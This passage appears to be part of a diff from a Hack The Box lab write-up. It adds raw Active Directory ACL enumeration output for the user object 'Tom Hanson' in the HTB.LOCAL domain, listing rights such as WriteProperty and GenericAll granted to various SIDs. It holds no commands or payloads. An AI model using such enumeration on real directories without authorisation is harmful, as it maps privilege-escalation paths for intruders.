+AceType                : AccessAllowedObject                                                                                    
+AceFlags               : ContainerInherit                                                                                       
+IsInherited            : False                                                                                                  
+InheritanceFlags       : ContainerInherit                                                                                       
+PropagationFlags       : None                                                                                                   
+AuditFlags             : None                                                                                                   
+
+ObjectDN               : CN=Tom Hanson,CN=Users,DC=HTB,DC=LOCAL                                                                 
+ObjectSID              : S-1-5-21-2648318136-3688571242-2924127574-1107                                                         
+ActiveDirectoryRights  : WriteProperty                                                                                          
+ObjectAceFlags         : ObjectAceTypePresent                                                                                   
+ObjectAceType          : 5430e777-c3ea-4024-902e-dde192204669                                                                   
+InheritedObjectAceType : 00000000-0000-0000-0000-000000000000                                                                   
+BinaryLength           : 56                                                                                                     
+AceQualifier           : AccessAllowed                                                                                          
+IsCallback             : False                                                                                                  
+OpaqueLength           : 0                                                                                                      
+AccessMask             : 32                                                                                                     
+SecurityIdentifier     : S-1-5-21-2648318136-3688571242-2924127574-1119                                                         
+AceType                : AccessAllowedObject                                                                                    
+AceFlags               : ContainerInherit                                                                                       
+IsInherited            : False                                                                                                  
+InheritanceFlags       : ContainerInherit                                                                                       
+PropagationFlags       : None                                                                                                   
+AuditFlags             : None                                                                                                   
+
+ObjectDN               : CN=Tom Hanson,CN=Users,DC=HTB,DC=LOCAL                                                                 
+ObjectSID              : S-1-5-21-2648318136-3688571242-2924127574-1107                                                         
+ActiveDirectoryRights  : WriteProperty                                                                                          
+ObjectAceFlags         : ObjectAceTypePresent                                                                                   
+ObjectAceType          : 6f606079-3a82-4c1b-8efb-dcc8c91d26fe                                                                   
+InheritedObjectAceType : 00000000-0000-0000-0000-000000000000                                                                   
+BinaryLength           : 56                                                                                                     
+AceQualifier           : AccessAllowed                                                                                          
+IsCallback             : False                                                                                                  
+OpaqueLength           : 0                                                                                                      
+AccessMask             : 32                                                                                                     
+SecurityIdentifier     : S-1-5-21-2648318136-3688571242-2924127574-1119                                                         
+AceType                : AccessAllowedObject                                                                                    
+AceFlags               : ContainerInherit                                                                                       
+IsInherited            : False                                                                                                  
+InheritanceFlags       : ContainerInherit                                                                                       
+PropagationFlags       : None                                                                                                   
+AuditFlags             : None                                                                                                   
+
+ObjectDN               : CN=Tom Hanson,CN=Users,DC=HTB,DC=LOCAL                                                                 
+ObjectSID              : S-1-5-21-2648318136-3688571242-2924127574-1107                                                         
+ActiveDirectoryRights  : WriteProperty                                                                                          
+ObjectAceFlags         : ObjectAceTypePresent                                                                                   
+ObjectAceType          : bf967a7f-0de6-11d0-a285-00aa003049e2                                                                   
+InheritedObjectAceType : 00000000-0000-0000-0000-000000000000                                                                   
+BinaryLength           : 56                                                                                                     
+AceQualifier           : AccessAllowed                                                                                          
+IsCallback             : False                                                                                                  
+OpaqueLength           : 0                                                                                                      
+AccessMask             : 32                                                                                                     
+SecurityIdentifier     : S-1-5-21-2648318136-3688571242-2924127574-1119                                                         
+AceType                : AccessAllowedObject                                                                                    
+AceFlags               : ContainerInherit                                                                                       
+IsInherited            : False                                                                                                  
+InheritanceFlags       : ContainerInherit                                                                                       
+PropagationFlags       : None                                                                                                   
+AuditFlags             : None                                                                                                   
+
+ObjectDN               : CN=Tom Hanson,CN=Users,DC=HTB,DC=LOCAL                                                                 
+ObjectSID              : S-1-5-21-2648318136-3688571242-2924127574-1107                                                         
+ActiveDirectoryRights  : WriteProperty                                                                                          
+ObjectAceFlags         : ObjectAceTypePresent                                                                                   
+ObjectAceType          : 614aea82-abc6-4dd0-a148-d67a59c72816                                                                   
+InheritedObjectAceType : 00000000-0000-0000-0000-000000000000                                                                   
+BinaryLength           : 56                                                                                                     
+AceQualifier           : AccessAllowed                                                                                          
+IsCallback             : False                                                                                                  
+OpaqueLength           : 0                                                                                                      
+AccessMask             : 32                                                                                                     
+SecurityIdentifier     : S-1-5-21-2648318136-3688571242-2924127574-1119                                                         
+AceType                : AccessAllowedObject                                                                                    
+AceFlags               : ContainerInherit                                                                                       
+IsInherited            : False                                                                                                  
+InheritanceFlags       : ContainerInherit                                                                                       
+PropagationFlags       : None                                                                                                   
+AuditFlags             : None                                                                                                   
+
+ObjectDN               : CN=Tom Hanson,CN=Users,DC=HTB,DC=LOCAL                                                                 
+ObjectSID              : S-1-5-21-2648318136-3688571242-2924127574-1107                                                         
+ActiveDirectoryRights  : WriteProperty                                                                                          
+ObjectAceFlags         : ObjectAceTypePresent                                                                                   
+ObjectAceType          : 66437984-c3c5-498f-b269-987819ef484b                                                                   
+InheritedObjectAceType : 00000000-0000-0000-0000-000000000000                                                                   
+BinaryLength           : 56                                                                                                     
+AceQualifier           : AccessAllowed                                                                                          
+IsCallback             : False                                                                                                  
+OpaqueLength           : 0                                                                                                      
+AccessMask             : 32                                                                                                     
+SecurityIdentifier     : S-1-5-21-2648318136-3688571242-2924127574-1119                                                         
+AceType                : AccessAllowedObject                                                                                    
+AceFlags               : ContainerInherit                                                                                       
+IsInherited            : False                                                                                                  
+InheritanceFlags       : ContainerInherit                                                                                       
+PropagationFlags       : None                                                                                                   
+AuditFlags             : None                                                                                                   
+
+ObjectDN               : CN=Tom Hanson,CN=Users,DC=HTB,DC=LOCAL                                                                 
+ObjectSID              : S-1-5-21-2648318136-3688571242-2924127574-1107                                                         
+ActiveDirectoryRights  : WriteProperty                                                                                          
+ObjectAceFlags         : ObjectAceTypePresent                                                                                   
+ObjectAceType          : 77b5b886-944a-11d1-aebd-0000f80367c1                                                                   
+InheritedObjectAceType : 00000000-0000-0000-0000-000000000000                                                                   
+BinaryLength           : 56                                                                                                     
+AceQualifier           : AccessAllowed                                                                                          
+IsCallback             : False                                                                                                  
+OpaqueLength           : 0                                                                                                      
+AccessMask             : 32                                                                                                     
+SecurityIdentifier     : S-1-5-21-2648318136-3688571242-2924127574-1120                                                         
+AceType                : AccessAllowedObject                                                                                    
+AceFlags               : ContainerInherit                                                                                       
+IsInherited            : False                                                                                                  
+InheritanceFlags       : ContainerInherit                                                                                       
+PropagationFlags       : None                                                                                                   
+AuditFlags             : None                                                                                                   
+
+ObjectDN               : CN=Tom Hanson,CN=Users,DC=HTB,DC=LOCAL                                                                 
+ObjectSID              : S-1-5-21-2648318136-3688571242-2924127574-1107                                                         
+ActiveDirectoryRights  : WriteProperty                                                                                          
+ObjectAceFlags         : ObjectAceTypePresent                                                                                   
+ObjectAceType          : a8df7489-c5ea-11d1-bbcb-0080c76670c0                                                                   
+InheritedObjectAceType : 00000000-0000-0000-0000-000000000000                                                                   
+BinaryLength           : 56                                                                                                     
+AceQualifier           : AccessAllowed                                                                                          
+IsCallback             : False                                                                                                  
+OpaqueLength           : 0                                                                                                      
+AccessMask             : 32                                                                                                     
+SecurityIdentifier     : S-1-5-21-2648318136-3688571242-2924127574-1108                                                         
+AceType                : AccessAllowedObject                                                                                    
+AceFlags               : ContainerInherit                                                                                       
+IsInherited            : False                                                                                                  
+InheritanceFlags       : ContainerInherit                                                                                       
+PropagationFlags       : None                                                                                                   
+AuditFlags             : None                                                                                                   
+
+ObjectDN               : CN=Tom Hanson,CN=Users,DC=HTB,DC=LOCAL                                                                 
+ObjectSID              : S-1-5-21-2648318136-3688571242-2924127574-1107                                                         
+ActiveDirectoryRights  : WriteProperty                                                                                          
+ObjectAceFlags         : ObjectAceTypePresent                                                                                   
+ObjectAceType          : a8df7489-c5ea-11d1-bbcb-0080c76670c0                                                                   
+InheritedObjectAceType : 00000000-0000-0000-0000-000000000000                                                                   
+BinaryLength           : 56                                                                                                     
+AceQualifier           : AccessAllowed                                                                                          
+IsCallback             : False                                                                                                  
+OpaqueLength           : 0                                                                                                      
+AccessMask             : 32                                                                                                     
+SecurityIdentifier     : S-1-5-21-2648318136-3688571242-2924127574-1120                                                         
+AceType                : AccessAllowedObject                                                                                    
+AceFlags               : ContainerInherit                                                                                       
+IsInherited            : False                                                                                                  
+InheritanceFlags       : ContainerInherit                                                                                       
+PropagationFlags       : None                                                                                                   
+AuditFlags             : None                                                                                                   
+
+ObjectDN               : CN=Tom Hanson,CN=Users,DC=HTB,DC=LOCAL                                                                 
+ObjectSID              : S-1-5-21-2648318136-3688571242-2924127574-1107                                                         
+ActiveDirectoryRights  : WriteProperty                                                                                          
+ObjectAceFlags         : ObjectAceTypePresent                                                                                   
+ObjectAceType          : 1f298a89-de98-47b8-b5cd-572ad53d267e                                                                   
+InheritedObjectAceType : 00000000-0000-0000-0000-000000000000                                                                   
+BinaryLength           : 56                                                                                                     
+AceQualifier           : AccessAllowed                                                                                          
+IsCallback             : False                                                                                                  
+OpaqueLength           : 0                                                                                                      
+AccessMask             : 32                                                                                                     
+SecurityIdentifier     : S-1-5-21-2648318136-3688571242-2924127574-1108                                                         
+AceType                : AccessAllowedObject                                                                                    
+AceFlags               : ContainerInherit                                                                                       
+IsInherited            : False                                                                                                  
+InheritanceFlags       : ContainerInherit                                                                                       
+PropagationFlags       : None                                                                                                   
+AuditFlags             : None                                                                                                   
+
+ObjectDN               : CN=Tom Hanson,CN=Users,DC=HTB,DC=LOCAL                                                                 
+ObjectSID              : S-1-5-21-2648318136-3688571242-2924127574-1107                                                         
+ActiveDirectoryRights  : WriteProperty                                                                                          
+ObjectAceFlags         : ObjectAceTypePresent                                                                                   
+ObjectAceType          : 1f298a89-de98-47b8-b5cd-572ad53d267e                                                                   
+InheritedObjectAceType : 00000000-0000-0000-0000-000000000000                                                                   
+BinaryLength           : 56                                                                                                     
+AceQualifier           : AccessAllowed                                                                                          
+IsCallback             : False                                                                                                  
+OpaqueLength           : 0                                                                                                      
+AccessMask             : 32                                                                                                     
+SecurityIdentifier     : S-1-5-21-2648318136-3688571242-2924127574-1120                                                         
+AceType                : AccessAllowedObject                                                                                    
+AceFlags               : ContainerInherit                                                                                       
+IsInherited            : False                                                                                                  
+InheritanceFlags       : ContainerInherit                                                                                       
+PropagationFlags       : None                                                                                                   
+AuditFlags             : None                                                                                                   
+
+ObjectDN               : CN=Tom Hanson,CN=Users,DC=HTB,DC=LOCAL                                                                 
+ObjectSID              : S-1-5-21-2648318136-3688571242-2924127574-1107                                                         
+ActiveDirectoryRights  : WriteProperty                                                                                          
+ObjectAceFlags         : ObjectAceTypePresent                                                                                   
+ObjectAceType          : f0f8ff9a-1191-11d0-a060-00aa006c33ed                                                                   
+InheritedObjectAceType : 00000000-0000-0000-0000-000000000000                                                                   
+BinaryLength           : 56                                                                                                     
+AceQualifier           : AccessAllowed                                                                                          
+IsCallback             : False                                                                                                  
+OpaqueLength           : 0                                                                                                      
+AccessMask             : 32                                                                                                     
+SecurityIdentifier     : S-1-5-21-2648318136-3688571242-2924127574-1108                                                         
+AceType                : AccessAllowedObject                                                                                    
+AceFlags               : ContainerInherit                                                                                       
+IsInherited            : False                                                                                                  
+InheritanceFlags       : ContainerInherit                                                                                       
+PropagationFlags       : None                                                                                                   
+AuditFlags             : None                                                                                                   
+
+ObjectDN               : CN=Tom Hanson,CN=Users,DC=HTB,DC=LOCAL                                                                 
+ObjectSID              : S-1-5-21-2648318136-3688571242-2924127574-1107                                                         
+ActiveDirectoryRights  : WriteProperty                                                                                          
+ObjectAceFlags         : ObjectAceTypePresent                                                                                   
+ObjectAceType          : f0f8ff9a-1191-11d0-a060-00aa006c33ed                                                                   
+InheritedObjectAceType : 00000000-0000-0000-0000-000000000000                                                                   
+BinaryLength           : 56                                                                                                     
+AceQualifier           : AccessAllowed                                                                                          
+IsCallback             : False                                                                                                  
+OpaqueLength           : 0                                                                                                      
+AccessMask             : 32                                                                                                     
+SecurityIdentifier     : S-1-5-21-2648318136-3688571242-2924127574-1119                                                         
+AceType                : AccessAllowedObject                                                                                    
+AceFlags               : ContainerInherit                                                                                       
+IsInherited            : False                                                                                                  
+InheritanceFlags       : ContainerInherit                                                                                       
+PropagationFlags       : None                                                                                                   
+AuditFlags             : None                                                                                                   
+
+ObjectDN               : CN=Tom Hanson,CN=Users,DC=HTB,DC=LOCAL                                                                 
+ObjectSID              : S-1-5-21-2648318136-3688571242-2924127574-1107                                                         
+ActiveDirectoryRights  : WriteProperty                                                                                          
+ObjectAceFlags         : ObjectAceTypePresent                                                                                   
+ObjectAceType          : f0f8ff9a-1191-11d0-a060-00aa006c33ed                                                                   
+InheritedObjectAceType : 00000000-0000-0000-0000-000000000000                                                                   
+BinaryLength           : 56                                                                                                     
+AceQualifier           : AccessAllowed                                                                                          
+IsCallback             : False                                                                                                  
+OpaqueLength           : 0                                                                                                      
+AccessMask             : 32                                                                                                     
+SecurityIdentifier     : S-1-5-21-2648318136-3688571242-2924127574-1120                                                         
+AceType                : AccessAllowedObject                                                                                    
+AceFlags               : ContainerInherit                                                                                       
+IsInherited            : False                                                                                                  
+InheritanceFlags       : ContainerInherit                                                                                       
+PropagationFlags       : None                                                                                                   
+AuditFlags             : None                                                                                                   
+
+ObjectDN               : CN=Tom Hanson,CN=Users,DC=HTB,DC=LOCAL                                                                 
+ObjectSID              : S-1-5-21-2648318136-3688571242-2924127574-1107                                                         
+ActiveDirectoryRights  : WriteProperty                                                                                          
+ObjectAceFlags         : ObjectAceTypePresent                                                                                   
+ObjectAceType          : 2cc06e9d-6f7e-426a-8825-0215de176e11                                                                   
+InheritedObjectAceType : 00000000-0000-0000-0000-000000000000                                                                   
+BinaryLength           : 56                                                                                                     
+AceQualifier           : AccessAllowed                                                                                          
+IsCallback             : False                                                                                                  
+OpaqueLength           : 0                                                                                                      
+AccessMask             : 32                                                                                                     
+SecurityIdentifier     : S-1-5-21-2648318136-3688571242-2924127574-1119                                                         
+AceType                : AccessAllowedObject                                                                                    
+AceFlags               : ContainerInherit                                                                                       
+IsInherited            : False                                                                                                  
+InheritanceFlags       : ContainerInherit                                                                                       
+PropagationFlags       : None                                                                                                   
+AuditFlags             : None                                                                                                   
+
+ObjectDN               : CN=Tom Hanson,CN=Users,DC=HTB,DC=LOCAL                                                                 
+ObjectSID              : S-1-5-21-2648318136-3688571242-2924127574-1107                                                         
+ActiveDirectoryRights  : WriteProperty                                                                                          
+ObjectAceFlags         : ObjectAceTypePresent                                                                                   
+ObjectAceType          : 5fd424a1-1262-11d0-a060-00aa006c33ed                                                                   
+InheritedObjectAceType : 00000000-0000-0000-0000-000000000000                                                                   
+BinaryLength           : 56                                                                                                     
+AceQualifier           : AccessAllowed                                                                                          
+IsCallback             : False                                                                                                  
+OpaqueLength           : 0                                                                                                      
+AccessMask             : 32                                                                                                     
+SecurityIdentifier     : S-1-5-21-2648318136-3688571242-2924127574-1108                                                         
+AceType                : AccessAllowedObject                                                                                    
+AceFlags               : ContainerInherit                                                                                       
+IsInherited            : False                                                                                                  
+InheritanceFlags       : ContainerInherit                                                                                       
+PropagationFlags       : None                                                                                                   
+AuditFlags             : None                                                                                                   
+
+ObjectDN               : CN=Tom Hanson,CN=Users,DC=HTB,DC=LOCAL                                                                 
+ObjectSID              : S-1-5-21-2648318136-3688571242-2924127574-1107                                                         
+ActiveDirectoryRights  : WriteProperty                                                                                          
+ObjectAceFlags         : ObjectAceTypePresent                                                                                   
+ObjectAceType          : 5fd424a1-1262-11d0-a060-00aa006c33ed                                                                   
+InheritedObjectAceType : 00000000-0000-0000-0000-000000000000                                                                   
+BinaryLength           : 56                                                                                                     
+AceQualifier           : AccessAllowed                                                                                          
+IsCallback             : False                                                                                                  
+OpaqueLength           : 0                                                                                                      
+AccessMask             : 32                                                                                                     
+SecurityIdentifier     : S-1-5-21-2648318136-3688571242-2924127574-1120                                                         
+AceType                : AccessAllowedObject                                                                                    
+AceFlags               : ContainerInherit                                                                                       
+IsInherited            : False                                                                                                  
+InheritanceFlags       : ContainerInherit                                                                                       
+PropagationFlags       : None                                                                                                   
+AuditFlags             : None                                                                                                   
+
+ObjectDN               : CN=Tom Hanson,CN=Users,DC=HTB,DC=LOCAL                                                                 
+ObjectSID              : S-1-5-21-2648318136-3688571242-2924127574-1107                                                         
+ActiveDirectoryRights  : WriteProperty                                                                                          
+ObjectAceFlags         : ObjectAceTypePresent                                                                                   
+ObjectAceType          : 3263e3b8-fd6b-4c60-87f2-34bdaa9d69eb                                                                   
+InheritedObjectAceType : 00000000-0000-0000-0000-000000000000                                                                   
+BinaryLength           : 56                                                                                                     
+AceQualifier           : AccessAllowed                                                                                          
+IsCallback             : False                                                                                                  
+OpaqueLength           : 0                                                                                                      
+AccessMask             : 32                                                                                                     
+SecurityIdentifier     : S-1-5-21-2648318136-3688571242-2924127574-1119                                                         
+AceType                : AccessAllowedObject                                                                                    
+AceFlags               : ContainerInherit                                                                                       
+IsInherited            : False                                                                                                  
+InheritanceFlags       : ContainerInherit                                                                                       
+PropagationFlags       : None                                                                                                   
+AuditFlags             : None                                                                                                   
+
+ObjectDN               : CN=Tom Hanson,CN=Users,DC=HTB,DC=LOCAL                                                                 
+ObjectSID              : S-1-5-21-2648318136-3688571242-2924127574-1107                                                         
+ActiveDirectoryRights  : WriteProperty                                                                                          
+ObjectAceFlags         : ObjectAceTypePresent                                                                                   
+ObjectAceType          : 28630ebc-41d5-11d1-a9c1-0000f80367c1                                                                   
+InheritedObjectAceType : 00000000-0000-0000-0000-000000000000                                                                   
+BinaryLength           : 56                                                                                                     
+AceQualifier           : AccessAllowed                                                                                          
+IsCallback             : False                                                                                                  
+OpaqueLength           : 0                                                                                                      
+AccessMask             : 32                                                                                                     
+SecurityIdentifier     : S-1-5-21-2648318136-3688571242-2924127574-1108                                                         
+AceType                : AccessAllowedObject                                                                                    
+AceFlags               : ContainerInherit                                                                                       
+IsInherited            : False                                                                                                  
+InheritanceFlags       : ContainerInherit                                                                                       
+PropagationFlags       : None                                                                                                   
+AuditFlags             : None                                                                                                   
+
+ObjectDN               : CN=Tom Hanson,CN=Users,DC=HTB,DC=LOCAL                                                                 
+ObjectSID              : S-1-5-21-2648318136-3688571242-2924127574-1107                                                         
+ActiveDirectoryRights  : WriteProperty                                                                                          
+ObjectAceFlags         : ObjectAceTypePresent                                                                                   
+ObjectAceType          : 28630ebc-41d5-11d1-a9c1-0000f80367c1                                                                   
+InheritedObjectAceType : 00000000-0000-0000-0000-000000000000                                                                   
+BinaryLength           : 56                                                                                                     
+AceQualifier           : AccessAllowed                                                                                          
+IsCallback             : False                                                                                                  
+OpaqueLength           : 0                                                                                                      
+AccessMask             : 32                                                                                                     
+SecurityIdentifier     : S-1-5-21-2648318136-3688571242-2924127574-1120                                                         
+AceType                : AccessAllowedObject                                                                                    
+AceFlags               : ContainerInherit                                                                                       
+IsInherited            : False                                                                                                  
+InheritanceFlags       : ContainerInherit                                                                                       
+PropagationFlags       : None                                                                                                   
+AuditFlags             : None                                                                                                   
+
+ObjectDN               : CN=Tom Hanson,CN=Users,DC=HTB,DC=LOCAL                                                                 
+ObjectSID              : S-1-5-21-2648318136-3688571242-2924127574-1107                                                         
+ActiveDirectoryRights  : WriteProperty                                                                                          
+ObjectAceFlags         : ObjectAceTypePresent                                                                                   
+ObjectAceType          : 7cb4c7d3-8787-42b0-b438-3c5d479ad31e                                                                   
+InheritedObjectAceType : 00000000-0000-0000-0000-000000000000                                                                   
+BinaryLength           : 56                                                                                                     
+AceQualifier           : AccessAllowed                                                                                          
+IsCallback             : False                                                                                                  
+OpaqueLength           : 0                                                                                                      
+AccessMask             : 32                                                                                                     
+SecurityIdentifier     : S-1-5-21-2648318136-3688571242-2924127574-1119                                                         
+AceType                : AccessAllowedObject                                                                                    
+AceFlags               : ContainerInherit                                                                                       
+IsInherited            : False                                                                                                  
+InheritanceFlags       : ContainerInherit                                                                                       
+PropagationFlags       : None                                                                                                   
+AuditFlags             : None                                                                                                   
+
+ObjectDN               : CN=Tom Hanson,CN=Users,DC=HTB,DC=LOCAL                                                                 
+ObjectSID              : S-1-5-21-2648318136-3688571242-2924127574-1107                                                         
+ActiveDirectoryRights  : GenericAll                                                                                             
+ObjectAceFlags         : ObjectAceTypePresent                                                                                   
+ObjectAceType          : 018849b0-a981-11d2-a9ff-00c04f8eedd8                                                                   
+InheritedObjectAceType : 00000000-0000-0000-0000-000000000000                                                                   
+BinaryLength           : 56                                                                                                     
+AceQualifier           : AccessAllowed                                                                                          
+IsCallback             : False                                                                                                  
+OpaqueLength           : 0                                                                                                      
+AccessMask             : 983551                                                                                                 
+SecurityIdentifier     : S-1-5-21-2648318136-3688571242-2924127574-1108                                                         
+AceType                : AccessAllowedObject                                                                                    
+AceFlags               : ContainerInherit                                                                                       
+IsInherited            : False                                                                                                  
+InheritanceFlags       : ContainerInherit                                                                                       
+PropagationFlags       : None                                                                                                   
+AuditFlags             : None                                                                                                   
+
+ObjectDN               : CN=Tom Hanson,CN=Users,DC=HTB,DC=LOCAL                                                                 
+ObjectSID              : S-1-5-21-2648318136-3688571242-2924127574-1107                                                         
+ActiveDirectoryRights  : GenericAll                                                                                             
+ObjectAceFlags         : ObjectAceTypePresent                                                                                   
+ObjectAceType          : 018849b0-a981-11d2-a9ff-00c04f8eedd8                                                                   
+InheritedObjectAceType : 00000000-0000-0000-0000-000000000000                                                                   
+BinaryLength           : 56                                                                                                     
+AceQualifier           : AccessAllowed                                                                                          
+IsCallback             : False                                                                                                  
+OpaqueLength           : 0                                                                                                      
+AccessMask             : 983551                                                                                                 
+SecurityIdentifier     : S-1-5-21-2648318136-3688571242-2924127574-1120                                                         
+AceType                : AccessAllowedObject                                                                                    
+AceFlags               : ContainerInherit                                                                                       
+IsInherited            : False                                                                                                  
+InheritanceFlags       : ContainerInherit                                                                                       
+PropagationFlags       : None                                                                                                   
+AuditFlags             : None                                                                                                   
+
+ObjectDN               : CN=Tom Hanson,CN=Users,DC=HTB,DC=LOCAL                                                                 
+ObjectSID              : S-1-5-21-2648318136-3688571242-2924127574-1107                                                         
+ActiveDirectoryRights  : ReadProperty, WriteProperty                                                                            
+ObjectAceFlags         : ObjectAceTypePresent                                                                                   
+ObjectAceType          : 6db69a1c-9422-11d1-aebd-0000f80367c1                                                                   
+InheritedObjectAceType : 00000000-0000-0000-0000-000000000000                                                                   
+BinaryLength           : 44                                                                                                     
+AceQualifier           : AccessAllowed                                                                                          
+IsCallback             : False                                                                                                  
+OpaqueLength           : 0                                                                                                      
+AccessMask             : 48                                                                                                     
+SecurityIdentifier     : S-1-5-32-561                                                                                           
+AceType                : AccessAllowedObject                                                                                    
+AceFlags               : None                                                                                                   
+IsInherited            : False                                                                                                  
+InheritanceFlags       : None                                                                                                   
+PropagationFlags       : None                                                                                                   
+AuditFlags             : None                                                                                                   
+
+ObjectDN               : CN=Tom Hanson,CN=Users,DC=HTB,DC=LOCAL                                                                 
+ObjectSID              : S-1-5-21-2648318136-3688571242-2924127574-1107                                                         
+ActiveDirectoryRights  : ReadProperty, WriteProperty                                                                            
+ObjectAceFlags         : ObjectAceTypePresent                                                                                   
+ObjectAceType          : 5805bc62-bdc9-4428-a5e2-856a0f4c185e                                                                   
+InheritedObjectAceType : 00000000-0000-0000-0000-000000000000                                                                   
+BinaryLength           : 44                                                                                                     
+AceQualifier           : AccessAllowed                                                                                          
+IsCallback             : False                                                                                                  
+OpaqueLength           : 0                                                                                                      
+AccessMask             : 48                                                                                                     
+SecurityIdentifier     : S-1-5-32-561                                                                                           
+AceType                : AccessAllowedObject                                                                                    
+AceFlags               : None                                                                                                   
+IsInherited            : False                                                                                                  
+InheritanceFlags       : None                                                                                                   
+PropagationFlags       : None                                                                                                   
+AuditFlags             : None                                                                                                   
+
+ObjectDN               : CN=Tom Hanson,CN=Users,DC=HTB,DC=LOCAL                                                                 
+ObjectSID              : S-1-5-21-2648318136-3688571242-2924127574-1107                                                         
+ActiveDirectoryRights  : ExtendedRight                                                                                          
+ObjectAceFlags         : ObjectAceTypePresent                                                                                   
+ObjectAceType          : ab721a53-1e2f-11d0-9819-00aa0040529b                                                                   
+InheritedObjectAceType : 00000000-0000-0000-0000-000000000000                                                                   
+BinaryLength           : 40                                                                                                     
+AceQualifier           : AccessAllowed                                                                                          
+IsCallback             : False                                                                                                  
+OpaqueLength           : 0                                                                                                      
+AccessMask             : 256                                                                                                    
+SecurityIdentifier     : S-1-1-0                                                                                                
+AceType                : AccessAllowedObject                                                                                    
+AceFlags               : None                                                                                                   
+IsInherited            : False                                                                                                  
+InheritanceFlags       : None                                                                                                   
+PropagationFlags       : None                                                                                                   
+AuditFlags             : None                                                                                                   
+
+ObjectDN               : CN=Tom Hanson,CN=Users,DC=HTB,DC=LOCAL                                                                 
+ObjectSID              : S-1-5-21-2648318136-3688571242-2924127574-1107                                                         
+ActiveDirectoryRights  : ExtendedRight                                                                                          
+ObjectAceFlags         : ObjectAceTypePresent                                                                                   
+ObjectAceType          : ab721a53-1e2f-11d0-9819-00aa0040529b                                                                   
+InheritedObjectAceType : 00000000-0000-0000-0000-000000000000                                                                   
+BinaryLength           : 40                                                                                                     
+AceQualifier           : AccessAllowed                                                                                          
+IsCallback             : False                                                                                                  
+OpaqueLength           : 0                                                                                                      
+AccessMask             : 256                                                                                                    
+SecurityIdentifier     : S-1-5-10                                                                                               
+AceType                : AccessAllowedObject                                                                                    
+AceFlags               : None                                                                                                   
+IsInherited            : False                                                                                                  
+InheritanceFlags       : None                                                                                                   
+PropagationFlags       : None                                                                                                   
+AuditFlags             : None                                    
+ObjectDN               : CN=Tom Hanson,CN=Users,DC=HTB,DC=LOCAL                                                                 
+ObjectSID              : S-1-5-21-2648318136-3688571242-2924127574-1107                                                         
+ActiveDirectoryRights  : ReadProperty, WriteProperty, ExtendedRight                                                             
+ObjectAceFlags         : ObjectAceTypePresent                                                                                   
+ObjectAceType          : 91e647de-d96f-4b70-9557-d63ff4f3ccd8                                                                   
+InheritedObjectAceType : 00000000-0000-0000-0000-000000000000                                                                   
+BinaryLength           : 40                                                                                                     
+AceQualifier           : AccessAllowed                                                                                          
+IsCallback             : False                                                                                                  
+OpaqueLength           : 0                                                                                                      
+AccessMask             : 304                                                                                                    
+SecurityIdentifier     : S-1-5-10                                                                                               
+AceType                : AccessAllowedObject                                                                                    
+AceFlags               : ContainerInherit                                                                                       
+IsInherited            : False                                                                                                  
+InheritanceFlags       : ContainerInherit                                                                                       
+PropagationFlags       : None                                                                                                   
+AuditFlags             : None                                                                                                   
+
+ObjectDN              : CN=Tom Hanson,CN=Users,DC=HTB,DC=LOCAL                                                                  
+ObjectSID             : S-1-5-21-2648318136-3688571242-2924127574-1107                                                          
+ActiveDirectoryRights : CreateChild, DeleteChild, Self, WriteProperty, ExtendedRight, GenericRead, WriteDacl, WriteOwner        
+BinaryLength          : 36                                                                                                      
+AceQualifier          : AccessAllowed                                                                                           
+IsCallback            : False                                                                                                   
+OpaqueLength          : 0                                                                                                       
+AccessMask            : 917951                                                                                                  
+SecurityIdentifier    : S-1-5-21-2648318136-3688571242-2924127574-512                                                           
+AceType               : AccessAllowed                                                                                           
+AceFlags              : None                                                                                                    
+IsInherited           : False                                                                                                   
+InheritanceFlags      : None                                                                                                    
+PropagationFlags      : None                                                                                                    
+AuditFlags            : None                                                                                                    
+
+ObjectDN              : CN=Tom Hanson,CN=Users,DC=HTB,DC=LOCAL                                                                  
+ObjectSID             : S-1-5-21-2648318136-3688571242-2924127574-1107                                                          
+ActiveDirectoryRights : CreateChild, DeleteChild, Self, WriteProperty, ExtendedRight, GenericRead, WriteDacl, WriteOwner        
+BinaryLength          : 36                                                                                                      
+AceQualifier          : AccessAllowed                                                                                           
+IsCallback            : False                                                                                                   
+OpaqueLength          : 0                                                                                                       
+AccessMask            : 917951                                                                                                  
+SecurityIdentifier    : S-1-5-21-2648318136-3688571242-2924127574-519                                                           
+AceType               : AccessAllowed                                                                                           
+AceFlags              : None                                                                                                    
+IsInherited           : False                                                                                                   
+InheritanceFlags      : None                                                                                                    
+PropagationFlags      : None                                                                                                    
+AuditFlags            : None                                                                                                    
+
+ObjectDN              : CN=Tom Hanson,CN=Users,DC=HTB,DC=LOCAL                                                                  
+ObjectSID             : S-1-5-21-2648318136-3688571242-2924127574-1107                                                          
+ActiveDirectoryRights : CreateChild, DeleteChild, Self, WriteProperty, ExtendedRight, Delete, GenericRead, WriteDacl,           
+                        WriteOwner                                                                                              
+BinaryLength          : 24                                                                                                      
+AceQualifier          : AccessAllowed                                                                                           
+IsCallback            : False                                                                                                   
+OpaqueLength          : 0                                                                                                       
+AccessMask            : 983487                                                                                                  
+SecurityIdentifier    : S-1-5-32-544                                                                                            
+AceType               : AccessAllowed                                                                                           
+AceFlags              : None                                                                                                    
+IsInherited           : False                                                                                                   
+InheritanceFlags      : None                                                                                                    
+PropagationFlags      : None                                                                                                    
+AuditFlags            : None                                                                                                    
+
+ObjectDN              : CN=Tom Hanson,CN=Users,DC=HTB,DC=LOCAL                                                                  
+ObjectSID             : S-1-5-21-2648318136-3688571242-2924127574-1107                                                          
+ActiveDirectoryRights : GenericAll                                                                                              
+BinaryLength          : 20                                                                                                      
+AceQualifier          : AccessAllowed                                                                                           
+IsCallback            : False                                                                                                   
+OpaqueLength          : 0                                                                                                       
+AccessMask            : 983551                                                                                                  
+SecurityIdentifier    : S-1-5-18                                                                                                
+AceType               : AccessAllowed                                                                                           
+AceFlags              : None                                                                                                    
+IsInherited           : False                                                                                                   
+InheritanceFlags      : None                                                                                                    
+PropagationFlags      : None                                                                                                    
+AuditFlags            : None 
+```
